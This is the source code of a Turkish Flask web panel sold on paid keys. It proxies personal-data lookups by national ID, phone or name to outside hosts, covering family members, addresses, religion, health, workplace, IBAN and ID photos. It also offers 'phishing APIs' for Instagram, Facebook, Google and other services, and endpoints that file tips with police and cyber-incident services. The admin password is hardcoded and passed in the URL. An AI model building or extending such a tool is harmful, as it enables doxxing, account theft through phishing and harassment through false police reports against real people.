"""                                                                                                                                                     
ÖZSOY PANEL - GÜNCELLENMİŞ API LISTESI
- Phishing ve İhbar API'leri korundu
- Yeni NabisC API'ler eklendi
"""

from datetime import datetime, timedelta
import os
import secrets
import string
import requests
import time
import json
from functools import wraps

from flask import Flask, request, session, jsonify, render_template, redirect, url_for, flash
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash

# ----------------------------------------------------------------------------
# FLASK APP
# ----------------------------------------------------------------------------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'keneviz.sqlite')

app = Flask(__name__, static_folder='static', template_folder='templates')
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_PATH}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = secrets.token_urlsafe(64)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
db = SQLAlchemy(app)

# Sabit FREE_KEY
SABIT_FREE_KEY = "FREESORGUPANELI2025A"

# ----------------------------------------------------------------------------
# MODELS
# ----------------------------------------------------------------------------
class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

class Key(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(64), unique=True, nullable=False, index=True)
    plan = db.Column(db.String(32), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.now)
    expires_at = db.Column(db.DateTime, nullable=True)
    active = db.Column(db.Boolean, default=True)
    notes = db.Column(db.Text, nullable=True)
    owner = db.Column(db.String(200), nullable=True)

    def is_expired(self):
        if not self.expires_at:
            return False
        return datetime.now() > self.expires_at

    def is_vip(self):
        return self.plan != 'free'

# ----------------------------------------------------------------------------
# YARDIMCI FONKSİYONLAR
# ----------------------------------------------------------------------------
def init_db():
    with app.app_context():
        db.create_all()

        # Admin oluştur
        if Admin.query.first() is None:
            admin = Admin(username='admin', password_hash=generate_password_hash('admin123'))
            db.session.add(admin)
            db.session.commit()
            print("[INFO] Admin: admin / admin123")

        # Free key oluştur
        if not Key.query.filter_by(key=SABIT_FREE_KEY).first():
            free_key = Key(
                key=SABIT_FREE_KEY,
                plan='free',
                created_at=datetime.now(),
                expires_at=None,
                active=True,
                notes='Sabit Free Key',
                owner='SYSTEM'
            )
            db.session.add(free_key)
            db.session.commit()
            print(f"[INFO] FREE Key: {SABIT_FREE_KEY}")

def generate_key_string(length=20):
    alphabet = string.ascii_uppercase + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))

PLAN_TO_DAYS = {
    '1hafta': 7,
    '1ay': 30,
    '3ay': 90,
    '1yil': 365,
    'free': None
}

def create_key(plan='1ay', notes=None, owner=None):
    while True:
        k = generate_key_string(20)
        if not Key.query.filter_by(key=k).first():
            break

    expires = None
    days = PLAN_TO_DAYS.get(plan)
    if days:
        expires = datetime.now() + timedelta(days=days)

    key = Key(
        key=k,
        plan=plan,
        expires_at=expires,
        notes=notes,
        owner=owner,
        active=True
    )
    db.session.add(key)
    db.session.commit()

    print(f"[KEY] {k} ({plan}) oluşturuldu")
    return key

def verify_key_string(kstr):
    if not kstr or not kstr.strip():
        return None

    kstr = kstr.strip()

    # Sabit free key
    if kstr == SABIT_FREE_KEY:
        key = Key.query.filter_by(key=SABIT_FREE_KEY).first()
        if not key:
            key = Key(
                key=SABIT_FREE_KEY,
                plan='free',
                created_at=datetime.now(),
                expires_at=None,
                active=True,
                notes='Sabit Free Key',
                owner='SYSTEM'
            )
            db.session.add(key)
            db.session.commit()
        return key

    # Normal key
    key = Key.query.filter_by(key=kstr).first()

    if not key:
        return None

    if not key.active:
        return None

    if key.is_expired():
        key.active = False
        db.session.commit()
        return None

    return key

# ----------------------------------------------------------------------------
# DECORATOR'LAR
# ----------------------------------------------------------------------------
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'key' not in session:
            return redirect(url_for('login'))

        key_str = session.get('key')
        key = verify_key_string(key_str)
        if not key:
            session.clear()
            flash('Key geçersiz veya süresi dolmuş')
            return redirect(url_for('login'))

        return f(*args, **kwargs)
    return decorated_function

# ----------------------------------------------------------------------------
# GÜNCELLENMİŞ API LISTESI
# ----------------------------------------------------------------------------
APIS = {
    # FREE API'ler (Basit sorgular)
    'tc': {'name': 'TC Sorgulama', 'plan': 'free', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/tc?tc={tc}', 'params': ['tc']},
    'yas': {'name': 'Yaş Sorgulama', 'plan': 'free', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/yas?tc={tc}', 'params': ['tc']},
    'adsoyad': {'name': 'Ad Soyad Sorgu', 'plan': 'free', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/sorgu?ad={ad}&soyad={soyad}', 'params': ['ad', 'soyad']},
    
    # VIP API'ler (Yeni NabisC API'ler)
    # Temel Bilgiler
    'tcyeni': {'name': 'TC Yeni Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/tcyeni?tc={tc}', 'params': ['tc']},
    'adyeni': {'name': 'Ad Soyad Yeni Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/adyeni?ad={ad}&soyad={soyad}', 'params': ['ad', 'soyad']},
    'gsmyeni': {'name': 'GSM Yeni Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/gsmyeni?gsm={gsm}', 'params': ['gsm']},
    
    # Aile ve Akraba API'leri
    'aile': {'name': 'Aile Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/aile?tc={tc}', 'params': ['tc']},
    'sulale': {'name': 'Sülale Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/sulale?tc={tc}', 'params': ['tc']},
    'anne': {'name': 'Anne Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/anne?tc={tc}', 'params': ['tc']},
    'baba': {'name': 'Baba Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/baba?tc={tc}', 'params': ['tc']},
    'kardes': {'name': 'Kardeş Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/kardes?tc={tc}', 'params': ['tc']},
    'cocuk': {'name': 'Çocuk Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/cocuk?tc={tc}', 'params': ['tc']},
    'cocuklar': {'name': 'Çocuklar Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/cocuklar?tc={tc}', 'params': ['tc']},
    'dede': {'name': 'Dede Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/dede?tc={tc}', 'params': ['tc']},
    'nine': {'name': 'Nine Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/nine?tc={tc}', 'params': ['tc']},
    'amca': {'name': 'Amca Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/amca?tc={tc}', 'params': ['tc']},
    'dayi': {'name': 'Dayı Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/dayi?tc={tc}', 'params': ['tc']},
    'hala': {'name': 'Hala Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/hala?tc={tc}', 'params': ['tc']},
    'teyze': {'name': 'Teyze Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/teyze?tc={tc}', 'params': ['tc']},
    'kuzen': {'name': 'Kuzen Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/kuzen?tc={tc}', 'params': ['tc']},
    'yegen': {'name': 'Yeğen Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/yegen?tc={tc}', 'params': ['tc']},
    
    # İletişim ve Adres API'leri
    'tcgsm': {'name': 'TC → GSM Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/tcgsm?tc={tc}', 'params': ['tc']},
    'gsmtc': {'name': 'GSM → TC Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/gsmtc?gsm={gsm}', 'params': ['gsm']},
    'adres': {'name': 'Adres Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/adres?tc={tc}', 'params': ['tc']},
    'gunceladres': {'name': 'Güncel Adres Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/guncelAdres?ad={ad}&soyad={soyad}&tc={tc}', 'params': ['ad', 'soyad', 'tc']},
    
    # Detaylı Bilgi API'leri
    'saglik': {'name': 'Sağlık Bilgileri', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/saglik', 'params': []},
    'cinsiyet': {'name': 'Cinsiyet Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/cinsiyet?tc={tc}', 'params': ['tc']},
    'din': {'name': 'Din Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/din?tc={tc}', 'params': ['tc']},
    'burc': {'name': 'Burç Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/burc?tc={tc}', 'params': ['tc']},
    'medenihal': {'name': 'Medeni Hal Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/medenihal?tc={tc}', 'params': ['tc']},
    'dogumyeri': {'name': 'Doğum Yeri Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/dogumyeri?tc={tc}', 'params': ['tc']},
    'koy': {'name': 'Köy Bilgisi Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/koy?tc={tc}', 'params': ['tc']},
    'vergino': {'name': 'Vergi No Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/vergino?tc={tc}', 'params': ['tc']},
    'kimlikkayit': {'name': 'Kimlik Kayıt Bilgisi', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/kimlikkayit?tc={tc}', 'params': ['tc']},
    
    # İş ve Çalışma API'leri
    'isyerisektoru': {'name': 'İşyeri Sektörü', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/isyeriSektoru?ad={ad}&soyad={soyad}&tc={tc}', 'params': ['ad', 'soyad', 'tc']},
    'isegiristarihi': {'name': 'İşe Giriş Tarihi', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/iseGirisTarihi?ad={ad}&soyad={soyad}&tc={tc}', 'params': ['ad', 'soyad', 'tc']},
    'isyeriunvani': {'name': 'İşyeri Ünvanı', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/isyeriUnvani?ad={ad}&soyad={soyad}&tc={tc}', 'params': ['ad', 'soyad', 'tc']},
    
    # Diğer API'ler
    'tcplaka': {'name': 'TC Plaka Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/tcplaka?tc={tc}', 'params': ['tc']},
    'yetimlik': {'name': 'Yetimlik Bilgisi', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/yetimlik?babatc={babatc}', 'params': ['babatc']},
    'yeniden': {'name': 'Yeniden Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/yeniden?tc={tc}', 'params': ['tc']},
    'olumtarihi': {'name': 'Ölüm Tarihi Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/olumtarihi?tc={tc}', 'params': ['tc']},
    'sms': {'name': 'SMS Bilgisi', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/sms?gsm={gsm}', 'params': ['gsm']},
    'kizliksoyad': {'name': 'Kızlık Soyadı', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/kizliksoyad?tc={tc}', 'params': ['tc']},
    'hikaye': {'name': 'Hikaye Bilgisi', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/hikaye?tc={tc}', 'params': ['tc']},
    'sirano': {'name': 'Sıra No Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/sirano?tc={tc}', 'params': ['tc']},
    'ayakno': {'name': 'Ayak No Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/ayakno?tc={tc}', 'params': ['tc']},
    'operator': {'name': 'Operatör Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/operator?gsm={gsm}', 'params': ['gsm']},
    'yabanci': {'name': 'Yabancı Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/yabanci?ad={ad}&soyad={soyad}', 'params': ['ad', 'soyad']},
    'raw': {'name': 'Raw Veri Sorgu', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/raw?tc={tc}', 'params': ['tc']},
    
    # IBAN API'leri
    'iban_dogrulama': {'name': 'IBAN Doğrulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/iban_dogrulama?iban={iban}', 'params': ['iban']},
    'iban_sorgulama': {'name': 'IBAN Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/iban_sorgulama?iban={iban}', 'params': ['iban']},
    
    # Vesika API'leri
    'vesika': {'name': 'Vesika Sorgulama', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/vesika?tc={tc}', 'params': ['tc']},
    'vesika_download': {'name': 'Vesika İndirme', 'plan': 'vip', 'endpoint': 'https://nabiscapi-m6ii.onrender.com/vesika_download?tc={tc}', 'params': ['tc']},
    
    # KORUNAN API'ler (Phishing ve İhbar) - Bunlar eski halinde korunuyor
    'jandarmaihbar': {'name': 'Jandarma İhbar', 'plan': 'vip', 'endpoint': 'https://nabisystemm-vipapi.onrender.com/jandarmaihbar?adres={adres}&detay={detay}', 'params': ['adres', 'detay']},
    'egmihbar': {'name': 'EGM İhbar', 'plan': 'vip', 'endpoint': 'https://nabisystemm-vipapi.onrender.com/egmihbar?adres={adres}&detay={detay}', 'params': ['adres', 'detay']},
    'usomihbar': {'name': 'USOM İhbar', 'plan': 'vip', 'endpoint': 'https://nabisystemm-vipapi.onrender.com/usomihbar?adres={adres}&detay={detay}', 'params': ['adres', 'detay']},
    
    # Phishing API'leri
    'instagram': {'name': 'Instagram Phishing', 'plan': 'vip', 'endpoint': 'https://phishing-lf66.onrender.com/instagram?token={token}&id={id}', 'params': ['token', 'id']},
    'facebook': {'name': 'Facebook Phishing', 'plan': 'vip', 'endpoint': 'https://phishing-lf66.onrender.com/facebook?token={token}&id={id}', 'params': ['token', 'id']},
    'netflix': {'name': 'Netflix Phishing', 'plan': 'vip', 'endpoint': 'https://phishing-lf66.onrender.com/netflix?token={token}&id={id}', 'params': ['token', 'id']},
    'tiktok': {'name': 'TikTok Phishing', 'plan': 'vip', 'endpoint': 'https://phishing-lf66.onrender.com/tiktok?token={token}&id={id}', 'params': ['token', 'id']},
    'twitter': {'name': 'Twitter Phishing', 'plan': 'vip', 'endpoint': 'https://phishing-lf66.onrender.com/twitter?token={token}&id={id}', 'params': ['token', 'id']},
    'google': {'name': 'Google Phishing', 'plan': 'vip', 'endpoint': 'https://phishing-lf66.onrender.com/google?token={token}&id={id}', 'params': ['token', 'id']},
    'microsoft': {'name': 'Microsoft Phishing', 'plan': 'vip', 'endpoint': 'https://phishing-lf66.onrender.com/microsoft?token={token}&id={id}', 'params': ['token', 'id']},
    'spotify': {'name': 'Spotify Phishing', 'plan': 'vip', 'endpoint': 'https://phishing-lf66.onrender.com/spotify?token={token}&id={id}', 'params': ['token', 'id']},
}

# ----------------------------------------------------------------------------
# ROUTE'LAR - ROBOT DOĞRULAMA GÜNCELLENDİ
# ----------------------------------------------------------------------------
@app.route('/')
def index():
    return redirect(url_for('robot_dogrulama'))

@app.route('/robot_dogrulama')
def robot_dogrulama():
    next_page = request.args.get('next', '/login')
    return render_template('robot_dogrulama.html', next_page=next_page)

@app.route('/keneviz_challenge', methods=['POST'])
def keneviz_challenge():
    nonce = secrets.token_urlsafe(16)
    session['keneviz_challenge'] = {
        'nonce': nonce,
        'ts': int(time.time()),
        'tries': 0,
    }
    session.modified = True
    return jsonify({'challenge_id': nonce, 'ts': session['keneviz_challenge']['ts']})

@app.route('/keneviz_verify', methods=['POST'])
def keneviz_verify():
    try:
        data = request.get_json() or {}
        saved = session.get('keneviz_challenge')

        if not saved:
            return jsonify({'success': False, 'error': 'no_challenge'}), 400

        incoming_nonce = data.get('challenge_id')
        if not incoming_nonce or incoming_nonce != saved.get('nonce'):
            return jsonify({'success': False, 'error': 'challenge_mismatch'}), 400

        session['keneviz_verified'] = True
        session.pop('keneviz_challenge', None)
        session.modified = True

        return jsonify({
            'success': True,
            'verification_token': 'verified',
            'redirect': data.get('next', '/login')
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/login', methods=['GET', 'POST'])
def login():
    if not session.get('keneviz_verified'):
        return redirect(url_for('robot_dogrulama') + '?next=/login')

    if request.method == 'GET':
        return render_template('login.html')

    key_str = request.form.get('key', '').strip()

    if not key_str:
        flash('Lütfen bir key girin')
        return redirect(url_for('login'))

    key = verify_key_string(key_str)

    if not key:
        flash('Geçersiz veya süresi dolmuş key')
        return redirect(url_for('login'))

    session['key'] = key.key
    session['plan'] = key.plan
    session['key_id'] = key.id
    session['logged_in'] = True
    session['username'] = f"user{key.id}"
    session['is_vip'] = key.plan != 'free'

    session.pop('keneviz_verified', None)
    session.modified = True

    return redirect(url_for('panel'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/panel')
@login_required
def panel():
    key_str = session.get('key')
    key = verify_key_string(key_str)

    if not key:
        session.clear()
        flash('Key geçersiz veya süresi dolmuş')
        return redirect(url_for('login'))

    user_plan = key.plan
    plan_name = "VIP" if user_plan != 'free' else "FREE"
    username = session.get('username', f"user{key.id}")
    is_vip = user_plan != 'free'

    remaining = "Sınırsız"
    remaining_days = None
    if key.expires_at:
        remaining_days = (key.expires_at - datetime.now()).days
        if remaining_days > 0:
            remaining = f"{remaining_days} gün"
        else:
            key.active = False
            db.session.commit()
            session.clear()
            flash('Key süreniz dolmuş')
            return redirect(url_for('login'))

    total_apis = len(APIS)
    free_apis = len([a for a in APIS.values() if a['plan'] == 'free'])
    vip_apis = len([a for a in APIS.values() if a['plan'] == 'vip'])

    user_apis = total_apis if is_vip else free_apis

    return render_template('panel.html',
                         key=key,
                         username=username,
                         plan_name=plan_name,
                         remaining=remaining,
                         total_apis=total_apis,
                         free_apis=free_apis,
                         vip_apis=vip_apis,
                         user_apis=user_apis,
                         free_key=SABIT_FREE_KEY,
                         is_vip=is_vip,
                         user_plan=user_plan)

@app.route('/sorgu.html')
@login_required
def sorgu_page():
    api_name = request.args.get('api', '').lower()

    if not api_name:
        return redirect(url_for('panel'))

    if api_name not in APIS:
        return f"<h1>Geçersiz API: {api_name}</h1>", 404

    key_str = session.get('key')
    key = verify_key_string(key_str)

    if not key:
        session.clear()
        flash('Key geçersiz veya süresi dolmuş')
        return redirect(url_for('login'))

    api_plan = APIS[api_name]['plan']
    user_plan = key.plan
    is_vip = user_plan != 'free'

    if api_plan == 'vip' and not is_vip:
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>VIP Gerekli</title>
            <style>
                body {{ background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%); color: white; font-family: sans-serif; text-align: center; padding: 50px; }}
                .error-box {{ background: rgba(255,0,0,0.1); border: 2px solid red; padding: 30px; border-radius: 15px; max-width: 500px; margin: auto; }}
                h1 {{ color: #fbbf24; }}
                button {{ background: linear-gradient(135deg, #f59e0b, #d97706); color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; cursor: pointer; margin-top: 20px; }}
                .info {{ background: rgba(255,255,255,0.05); padding: 15px; border-radius: 10px; margin: 15px 0; }}
            </style>
        </head>
        <body>
            <div class="error-box">
                <h1>🚫 VIP ÜYELİK GEREKLİ</h1>
                <div class="info">
                    <p><strong>{APIS[api_name]['name']}</strong> API'sini kullanmak için VIP üye olmalısınız.</p>
                    <p>Mevcut Planınız: <strong>{user_plan.upper()}</strong></p>
                    <p>Gerekli Plan: <strong>VIP</strong></p>
                </div>
                <p>Ücretsiz kullanıcılar sadece FREE API'lere erişebilir.</p>
                <button onclick="window.location.href='/abonelik.html'">🎯 VIP OL</button>
                <button onclick="window.location.href='/panel'" style="background: #64748b; margin-left: 10px;">🔙 Panel'e Dön</button>
            </div>
        </body>
        </html>
        ''', 403

    return render_template('sorgu.html',
                         api_id=api_name,
                         api_info=APIS[api_name])

@app.route('/abonelik.html')
def abonelik_page():
    return render_template('abonelik.html')

# ----------------------------------------------------------------------------
# API ENDPOINTS
# ----------------------------------------------------------------------------
@app.route('/api/user')
def api_user():
    if 'key' not in session:
        return jsonify({'logged_in': False, 'role': 'guest'})

    key_str = session.get('key')
    key = verify_key_string(key_str)

    if not key:
        session.clear()
        return jsonify({'logged_in': False, 'role': 'guest'})

    role = 'vip' if key.plan != 'free' else 'free'

    return jsonify({
        'logged_in': True,
        'role': role,
        'plan': key.plan,
        'is_vip': key.plan != 'free',
        'username': session.get('username', f"user{key.id}"),
        'key': key.key[:8] + '...',
        'plan_name': "VIP" if key.plan != 'free' else "FREE"
    })

@app.route('/api/list')
@login_required
def api_list():
    key_str = session.get('key')
    key = verify_key_string(key_str)

    total = len(APIS)
    free = len([a for a in APIS.values() if a['plan'] == 'free'])
    vip = len([a for a in APIS.values() if a['plan'] == 'vip'])

    return jsonify({
        'success': True,
        'total_apis': total,
        'free_apis': free,
        'vip_apis': vip
    })

@app.route('/api/sorgu', methods=['POST'])
@login_required
def api_sorgu():
    data = request.get_json() or {}
    api_id = data.get('api', '').lower()

    if not api_id:
        return jsonify({'success': False, 'error': 'API adı belirtilmemiş'}), 400

    if api_id not in APIS:
        return jsonify({'success': False, 'error': 'Geçersiz API'}), 404

    key_str = session.get('key')
    key = verify_key_string(key_str)

    if not key:
        session.clear()
        return jsonify({'success': False, 'error': 'Key geçersiz'}), 401

    api_plan = APIS[api_id]['plan']
    user_plan = key.plan
    is_vip = user_plan != 'free'

    print(f"🔍 VIP KONTROL: API={api_id}, API_Plan={api_plan}, User_Plan={user_plan}, Is_VIP={is_vip}")

    if api_plan == 'vip' and not is_vip:
        return jsonify({
            'success': False,
            'error': f'Bu API için VIP üyelik gereklidir. Mevcut planınız: {user_plan}',
            'redirect': '/abonelik.html',
            'api_name': APIS[api_id]['name'],
            'user_plan': user_plan,
            'required_plan': 'vip'
        }), 403

    api_endpoint = APIS[api_id]['endpoint']
    api_params = APIS[api_id]['params']

    filled_endpoint = api_endpoint
    for param in api_params:
        param_value = data.get(param, '')
        if param_value:
            filled_endpoint = filled_endpoint.replace(f'{{{param}}}', str(param_value))
        else:
            if param in ['tc', 'ad', 'soyad', 'gsm', 'numara', 'iban', 'site', 'token', 'id', 'adres', 'detay', 'babatc']:
                return jsonify({'success': False, 'error': f'{param} parametresi gereklidir'}), 400

    print(f"🌐 API İSTEĞİ: {filled_endpoint}")

    try:
        response = requests.get(filled_endpoint, timeout=10)

        if response.status_code == 200:
            try:
                result_data = response.json()
                return jsonify({'success': True, 'data': result_data})
            except:
                return jsonify({'success': True, 'data': response.text})
        else:
            return jsonify({
                'success': False,
                'error': f'API hatası: {response.status_code}',
                'response': response.text[:500]
            }), response.status_code
    except requests.RequestException as e:
        return jsonify({'success': False, 'error': f'İstek hatası: {str(e)}'}), 500

# ----------------------------------------------------------------------------
# KEY OLUŞTURMA API
# ----------------------------------------------------------------------------
@app.route('/adminapi/createkey')
def adminapi_createkey():
    auth = request.args.get('auth') or request.headers.get('X-Auth-Key')
    if auth != 'admin123':
        return jsonify({'success': False, 'error': 'Yetkisiz erişim'}), 401

    plan = request.args.get('plan', '1ay')
    owner = request.args.get('owner', 'API User')
    notes = request.args.get('notes', f'API ile oluşturuldu - {datetime.now().strftime("%Y-%m-%d")}')

    if plan not in PLAN_TO_DAYS:
        return jsonify({'success': False, 'error': 'Geçersiz plan'}), 400

    try:
        key = create_key(plan=plan, notes=notes, owner=owner)

        expires_info = "Süresiz" if not key.expires_at else key.expires_at.strftime("%d/%m/%Y %H:%M")

        return jsonify({
            'success': True,
            'key': key.key,
            'plan': key.plan,
            'created_at': key.created_at.strftime("%d/%m/%Y %H:%M"),
            'expires_at': expires_info,
            'owner': key.owner,
            'notes': key.notes
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ----------------------------------------------------------------------------
# ADMIN PANEL
# ----------------------------------------------------------------------------
@app.route('/admin')
def admin_panel():
    auth = request.args.get('auth')
    if auth != 'admin123':
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>Admin Giriş</title></head>
        <body style="background:#0f172a;color:white;padding:50px;text-align:center;">
            <h1>🔐 Admin Panel</h1>
            <p>admin / admin123</p>
            <br>
            <div style="max-width:400px;margin:auto;background:#1e293b;padding:30px;border-radius:15px;">
                <p><strong>API ile Key Oluştur:</strong></p>
                <code style="background:#0f172a;padding:10px;border-radius:5px;display:block;margin:10px 0;">
                    /adminapi/createkey?plan=1ay&owner=test&auth=admin123
                </code>
            </div>
        </body>
        </html>
        '''

    keys = Key.query.order_by(Key.created_at.desc()).all()

    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Panel</title>
        <style>
            body { background:#0f172a; color:white; font-family:monospace; padding:20px; }
            table { border-collapse: collapse; width: 100%; margin: 20px 0; }
            th, td { border: 1px solid #334155; padding: 10px; text-align: left; }
            th { background: #1e293b; }
            .vip { background: rgba(245,158,11,0.1); }
            .free { background: rgba(100,116,139,0.1); }
        </style>
    </head>
    <body>
        <h1>🔧 Admin Panel - Key Yönetimi</h1>

        <h2>📋 Mevcut Key'ler</h2>
        <table>
            <tr>
                <th>Key</th>
                <th>Plan</th>
                <th>Oluşturulma</th>
                <th>Bitiş</th>
                <th>Durum</th>
                <th>Sahip</th>
                <th>Not</th>
            </tr>
    '''

    for key in keys:
        status = '🟢 Aktif' if key.active and not key.is_expired() else '🔴 Pasif'
        row_class = 'vip' if key.plan != 'free' else 'free'

        expires = "Süresiz" if not key.expires_at else key.expires_at.strftime("%d/%m/%Y")
        created = key.created_at.strftime("%d/%m/%Y %H:%M")

        html += f'''
            <tr class="{row_class}">
                <td><code>{key.key}</code></td>
                <td>{key.plan.upper()}</td>
                <td>{created}</td>
                <td>{expires}</td>
                <td>{status}</td>
                <td>{key.owner or '-'}</td>
                <td>{key.notes or '-'}</td>
            </tr>
        '''

    html += '''
        </table>
    </body>
    </html>
    '''

    return html

# ----------------------------------------------------------------------------
# HATA SAYFALARI
# ----------------------------------------------------------------------------
@app.errorhandler(404)
def not_found(e):
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>404 - Sayfa Bulunamadı</title></head>
    <body style="background:#0f172a;color:white;text-align:center;padding:50px;">
        <h1>🔍 404 - Sayfa Bulunamadı</h1>
        <p><a href="/panel" style="color:#00e6ff;">🏠 Panel'e Dön</a></p>
    </body>
    </html>
    ''', 404

# ----------------------------------------------------------------------------
# BAŞLATMA
# ----------------------------------------------------------------------------
if __name__ == '__main__':
    init_db()

    print("\n" + "="*60)
    print("ÖZSOY PANEL - GÜNCELLENMİŞ API LISTESI")
    print("="*60)
    print(f"📱 URL: http://127.0.0.1:5000")
    print(f"🔑 FREE Key: {SABIT_FREE_KEY}")
    print(f"👑 Admin Panel: http://127.0.0.1:5000/admin?auth=admin123")
    print("="*60)
    print(f"📊 Toplam API: {len(APIS)}")
    print(f"🆓 Free API: {len([a for a in APIS.values() if a['plan'] == 'free'])}")
    print(f"👑 VIP API: {len([a for a in APIS.values() if a['plan'] == 'vip'])}")
    print("="*60)
    print("✨ YENİ API KATEGORİLERİ:")
    print("-"*60)
    print("🔹 TEMEL API'ler: TC, Yaş, Ad Soyad")
    print("🔹 AİLE API'leri: Anne, Baba, Kardeş, Çocuklar")
    print("🔹 AKRABA API'leri: Dede, Nine, Amca, Dayı, Hala, Teyze")
    print("🔹 İLETİŞİM API'leri: TC→GSM, GSM→TC, Adres")
    print("🔹 DETAY API'leri: Cinsiyet, Din, Burç, Medeni Hal")
    print("🔹 İŞ API'leri: İşyeri Sektörü, İşe Giriş Tarihi")
    print("🔹 DİĞER API'ler: IBAN, Vesika, Yabancı Sorgu")
    print("🔹 KORUNAN API'ler: Phishing ve İhbar API'leri")
    print("="*60 + "\n")

    port = int(os.environ.get('PORT', 5000))
    app.run(debug=True, host='0.0.0.0', port=port)
